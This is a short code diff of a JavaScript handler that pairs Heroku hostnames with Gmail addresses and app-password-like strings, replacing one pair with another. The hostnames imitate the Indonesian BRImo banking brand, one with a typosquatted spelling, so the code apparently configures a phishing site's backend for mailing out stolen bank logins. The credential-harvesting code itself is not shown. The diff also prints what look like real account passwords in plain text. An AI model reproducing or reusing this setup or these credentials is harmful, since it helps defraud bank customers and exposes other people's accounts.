@@ -59,9 +59,9 @@ export default function handler(req, res) {
         pass = 'xwnxmsljgdwgtcva';
        
     }
-    else if (url == 'daftar-brimo-bifas.herokuapp.com'){
-        email = 'abihder31@gmail.com';
-        pass = 'rrqzbqcfpuimwfsx';
+    else if (url == 'log-bifas-brlmo.herokuapp.com'){
+        email = 'derid1028@gmail.com';
+        pass = 'fzntnluddmuahidw';
        
         }
         
